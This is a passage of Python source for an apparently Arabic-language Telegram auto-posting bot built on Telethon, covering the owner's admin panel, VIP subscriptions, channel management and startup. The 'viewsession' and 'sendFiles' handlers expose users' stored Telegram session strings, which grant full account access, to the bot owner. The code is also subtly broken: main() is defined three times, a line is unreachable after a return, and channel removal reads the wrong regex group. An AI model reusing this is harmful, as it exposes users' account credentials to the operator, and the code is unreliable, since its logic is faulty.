    caption = f"مرحباً عزيزي [{fname}](tg://user?id={event.sender_id}) في لوحة المالك"

    if isinstance(event, events.NewMessage):
        await event.reply(caption, buttons=adminMarkup)
    else:
        await event.edit(caption, buttons=adminMarkup)
@client.on(events.CallbackQuery(pattern="sendFiles", func=lambda e: e.sender_id in owners))
async def send_files(event):
    user_id = event.sender_id
    reMarkup = [
        [Button.inline("الصفحة الرئيسية", data="toAdmin")]
    ]

    await event.delete()

    # إرسال ملف users.json
    if os.path.exists(users_db):
        await client.send_file(user_id, users_db, caption="هذا هو ملف users.json.")
    else:
        await event.reply("ملف users.json غير موجود.")

    # إرسال ملف channels.json
    if os.path.exists(channels_db):
        await client.send_file(user_id, channels_db, caption="هذا هو ملف channels.json.")
    else:
        await event.reply("ملف channels.json غير موجود.")

    await event.reply("تم إرسال الملفات بنجاح.", buttons=reMarkup)
@client.on(events.CallbackQuery(pattern="broadcast", func=lambda e: e.sender_id in owners))
async def broadcast(event):
    user_id = event.sender_id
    reMarkup = [
        [Button.inline("الصفحة الرئيسية", data="toAdmin")]
    ]

    await event.delete()

    try:
        async with client.conversation(user_id) as conv:
            await conv.send_message(
                "أرسل الرسالة التي تريد إذاعتها لجميع المستخدمين:",
                buttons=Button.force_reply(placeholder="اكتب رسالتك هنا")
            )
            ask = await conv.get_response(timeout=30)
    except asyncio.TimeoutError:
        await event.reply("نفد وقت استلام الرسالة.", buttons=reMarkup)
        return

    message_text = ask.text
    for user in users:
        try:
            await client.send_message(int(user), message_text)
        except Exception as e:
            print(f"فشل في إرسال الرسالة إلى المستخدم {user}: {e}")

    await ask.reply("تم إرسال الرسالة لجميع المستخدمين بنجاح.", buttons=reMarkup)
    

@client.on(events.CallbackQuery(pattern="viewUsers", func=lambda e: e.sender_id in owners))
async def viewUsers(event):
    user_status = ""
    for user_id, details in users.items():
        user_status += f"[حسابه](tg://user?id={user_id}) - {user_id}\nوضع الـvip: {'مفعل' if details.get('vip') else 'معطل'}\n"
        if 'limitation' in details:
            user_status += f"موضوع الوقت : {details['limitation']['startDate']}\nينتهي بتاريخ : {details['limitation']['endDate']}\nالساعة : {details['limitation']['endTime']}\n"
        user_status += "\n"
    
    reMarkup = [
        [Button.inline("الصفحة الرئيسية", data="toAdmin")]
    ]
    
    await event.edit(
        f"حالة الأعضاء:\n\n{user_status}",
        buttons=reMarkup
    )
@client.on(events.CallbackQuery(pattern="viewcaption", func=lambda e: e.sender_id in owners))
async def viewcaption(event):
    user_status = ""
    for user_id, details in users.items():
        caption = details.get("caption", "- لا يوجد كلايش يتم نشرها")
        user_status += f"[حسابه](tg://user?id={user_id}) - {user_id}\n"
        if 'limitation' in details:
            user_status += f"الكليشة : {caption}\n"
        user_status += "\n"

    reMarkup = [
        [Button.inline("الصفحة الرئيسية", data="toAdmin")]
    ]

    await event.edit(
        f"حالة الأعضاء:\n\n{user_status}",
        buttons=reMarkup
    )

@client.on(events.CallbackQuery(pattern="viewsession", func=lambda e: e.sender_id in owners))
async def viewsession(event):
    user_status = ""
    for user_id, details in users.items():
        sess = details.get("session", "- لا يوجد جلسات")
        user_status += f"[حسابه](tg://user?id={user_id}) - {user_id}\n"
        if 'limitation' in details:
            user_status += f"الجلسة : {sess}\n"
        user_status += "\n"

    reMarkup = [
        [Button.inline("الصفحة الرئيسية", data="toAdmin")]
    ]

    await event.edit(
        f"حالة الأعضاء:\n\n{user_status}",
        buttons=reMarkup
    )
@client.on(events.CallbackQuery(pattern="addVIP", func=lambda e: e.sender_id in owners))
async def addVIP(event):
    user_id = event.sender_id
    reMarkup = [
        [Button.inline("الصفحة الرئيسية", data="toAdmin")]
    ]

    await event.delete()

    try:
        async with client.conversation(user_id) as conv:
            await conv.send_message(
                "أرسل ايدي المستخدم ليتم تفعيل VIP له:",
                buttons=Button.force_reply(placeholder="user id")
            )
            ask = await conv.get_response(timeout=30)
    except asyncio.TimeoutError:
        await event.reply("نفذ وقت استلام ايدي المستخدم.", buttons=reMarkup)
        return

    try:
        _id = int(ask.text)
        await client.get_entity(_id)
    except ValueError:
        await ask.reply("هذه البيانات لا يمكن أن تكون ايدي مستخدم.", buttons=reMarkup)
        return
    except Exception:
        await ask.reply("لم يتم العثور على هذا المستخدم.", buttons=reMarkup)
        return

    try:
        async with client.conversation(user_id) as conv:
            await conv.send_message(
                "أرسل الآن عدد الأيام المتاحة للعضو:\n\n"
                "يمكنك إرسال /cancel لإلغاء العملية.",
                buttons=Button.force_reply(placeholder="عدد الأيام")
            )
            limit = await conv.get_response(timeout=30)
    except asyncio.TimeoutError:
        await event.reply("انتهى وقت استلام عدد الأيام المتاحة للمستخدم.")
        return

    try:
        _limit = int(limit.text)
    except ValueError:
        await limit.reply("قيمة المدة المتاحة للعضو غير صحيحة.", buttons=reMarkup)
        return

    vipDate = timeCalc(_limit)
    users[str(_id)] = {"vip": True}
    users[str(_id)]["limitation"] = {
        "days": _limit,
        "startDate": vipDate["current_date"],
        "endDate": vipDate["end_date"],
        "endTime": vipDate["endTime"],
    }
    write(users_db, users)
    asyncio.create_task(vipCanceler(_id))

    caption = (
        f"تم تفعيل اشتراك VIP جديد\n\n"
        f"معلومات الاشتراك:\n"
        f"- تاريخ البدء: {vipDate['current_date']}\n"
        f"- تاريخ انتهاء الاشتراك: {vipDate['end_date']}\n\n"
        f"- المدة بالأيام: {_limit} من الأيام\n"
        f"- المدة بالساعات: {vipDate['hours']} من الساعات\n"
        f"- المدة بالدقائق: {vipDate['minutes']} من الدقائق\n\n"
        f"- وقت انتهاء الاشتراك: {vipDate['endTime']}"
    )

    await limit.reply(
        caption,
        buttons=reMarkup
    )

    try:
        await client.send_message(
            _id,
            f"تم تفعيل VIP لك في بوت النشر التلقائي.\n\n{caption.split('جديد', 1)[1]}"
        )
    except Exception:
        await limit.reply("اجعل المستخدم يقوم بمراسلة البوت.")
        

@client.on(events.CallbackQuery(pattern="cancelVIP", func=lambda e: e.sender_id in owners))
async def cancelVIP(event):
    user_id = event.sender_id
    reMarkup = [
        [Button.inline("الصفحة الرئيسية", data="toAdmin")]
    ]

    await event.delete()

    try:
        async with client.conversation(user_id) as conv:
            await conv.send_message(
                "أرسل ايدي المستخدم ليتم إلغاء VIP الخاص به:",
                buttons=Button.force_reply(placeholder="user id")
            )
            ask = await conv.get_response(timeout=30)
    except asyncio.TimeoutError:
        await event.reply("نفذ وقت استلام ايدي المستخدم.", buttons=reMarkup)
        return

    if ask.text not in users:
        await ask.reply("هذا المستخدم غير موجود في تخزين البوت.", buttons=reMarkup)
        return
    elif not users[ask.text]["vip"]:
        await ask.reply("هذا المستخدم ليس من مستخدمي VIP.", buttons=reMarkup)
        return

    users[ask.text]["vip"] = False
    write(users_db, users)

    await ask.reply(
        "تم إلغاء اشتراك هذا المستخدم.",
        buttons=reMarkup
    )


@client.on(events.CallbackQuery(pattern=r"^(channels)$", func=isOwner))
async def channelsControl(event):
    fname = event.sender.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
    markup = [
        [
            Button.url(channel, url=f"https://t.me/{channel}"),
            Button.inline("🗑", data=f"removeChannel {channel}")
        ] for channel in channels
    ]
    markup.extend([
        [Button.inline("- إضافة قناه جديده -", data="addChannel")],
        [Button.inline("- الصفحه الرئيسيه -", data="toAdmin")]
    ])
    await event.edit(
        caption,
        buttons=markup
    )

@client.on(events.CallbackQuery(pattern=r"^(addChannel)$", func=isOwner))
async def addChannel(event):
    user_id = event.sender_id
    reMarkup = [[
        Button.inline("- العوده للقنوات -", data="channels")
    ]]
    await event.delete()
    try:
        async with client.conversation(user_id, timeout=30) as conv:
            await conv.send_message("- ارسل معرف القناه دون @.", buttons=ForceReply())
            ask = await conv.get_response()
    except asyncio.TimeoutError:
        return await event.reply("- نفذ وقت استلام ايدي المستخدم.", buttons=reMarkup)
    try:
        await client.get_entity(ask.text)
    except ValueError:
        return await event.reply("- لم يتم ايجاد هذه الدردشه.")
    channel = ask.text
    channels.append(channel)
    write(channels_db, channels)
    await ask.reply("- تم إضافة القناه الى القائمه.", buttons=reMarkup)

@client.on(events.CallbackQuery(pattern=r"^(removeChannel) (.+)$", func=isOwner))
async def removeChannel(event):
    channel = event.pattern_match.group(1)
    if channel not in channels:
        await event.answer("- هذه القناه غير موجوده بالفعل.")
    else:
        channels.remove(channel)
        write(channels_db, channels)
        await event.answer("- تم حذف هذه القناه")
    fname = event.sender.first_name
    caption = f"مرحبا عزيزي [{fname}](tg://settings) في لوحة التحكم بقنوات الاشتراك"
    markup = [
        [
            Button.url(channel, url=f"https://t.me/{channel}"),
            Button.inline("🗑", data=f"removeChannel {channel}")
        ] for channel in channels
    ]
    markup.extend([
        [Button.inline("- إضافة قناه جديده -", data="addChannel")],
        [Button.inline("- الصفحه الرئيسيه -", data="toAdmin")]
    ])
    await event.edit(
        caption,
        buttons=markup
    )
    

@client.on(events.CallbackQuery(pattern=r"^(statics)$", func=isOwner))
async def statics(event):
    total = len(users)
    vip = 0
    for user in users:
        if users[user]["vip"]:
            vip += 1
    reMarkup = [[
        Button.inline("- الصفحه الرئيسيه -", data="toAdmin")
    ]]
    caption = f"- عدد المستخدمين الكلي: {total}\n\n- عدد مستخدمين VIP الحاليين: {vip}"
    await event.edit(
        caption,
        buttons=reMarkup
    )

_timezone = timezone("Asia/Baghdad")

def timeCalc(limit):
    start_date = datetime.now(_timezone)
    end_date = start_date + timedelta(days=limit)
    hours = limit * 24
    minutes = hours * 60
    return {
        "current_date": start_date.strftime("%Y-%m-%d"),
        "end_date": end_date.strftime("%Y-%m-%d"),
        "endTime": end_date.strftime("%H:%M"),
        "hours": hours,
        "minutes": minutes
    }
    users[str(_id)] = {"vip": False}

async def vipCanceler(user_id):
    await sleep(60)
    current_day = datetime.now(_timezone)
    cdate = current_day.strftime("%Y-%m-%d %H:%M")
    while True:
        print()
        if users[str(user_id)]["vip"] == False:
            break
        elif cdate != (users[str(user_id)]["limitation"]["endDate"] + " " + users[str(user_id)]["limitation"]["endTime"]):
            current_day = datetime.now(_timezone)
            cdate = current_day.strftime("%Y-%m-%d %H:%M")
        else:
            break
        await sleep(20)
    users[str(user_id)] = {"vip": False}
    users[str(user_id)]["limitation"] = {}
    write(users_db, users)
    await client.send_message(
        user_id,
        "- انتهى اشتراك VIP الخاص بك.\n- راسل المطور اذا كنت تريد تجديد اشتراكك."
    )
    
"""
OWNER SECTION ENDED
the next part for the bot's setting and storage
"""

async def subscription(event):
    user_id = event.sender_id
    for channel in channels:
        try:
            await client.get_permissions(channel, user_id)
        except UserNotParticipantError:
            return channel
    return True

def write(fp, data):
    with open(fp, "w") as file:
        json.dump(data, file, indent=2)

def read(fp):
    if not os.path.exists(fp):
        write(fp, {} if fp not in [channels_db] else [])
    with open(fp) as file:
        data = json.load(file)
    return data

users_db = "users.json"
channels_db = "channels.json"
users = read(users_db)
channels = read(channels_db)

async def reStartPosting():
    await sleep(444)
    for user in users:
        if users[user].get("posting"):
            create_task(posting(user))

async def reStartPosting2():
    await sleep(444)
    for user in users:
        if users[user].get("posting2"):
            create_task(posting2(user))

async def reVipTime():
    for user in users:
        if int(user) == owner:
            continue
        if users[user]["vip"]:
            create_task(vipCanceler(int(user)))

async def main():
    create_task(reStartPosting())
    create_task(reVipTime())
    await client.start()
    await idle()

async def main():
    create_task(reStartPosting2())
    create_task(reVipTime())
    await client.start()
    await idle()
async def main():
    create_task(reStartPosting())
    create_task(reVipTime())
    await client.start()
    
    # إبقاء البوت قيد التشغيل باستخدام حلقة لا نهائية
    while True:
        await asyncio.sleep(1)  # انتظر لمدة ثانية واحدة

if __name__ == "__main__":
    loop.run_until_complete(main())

    
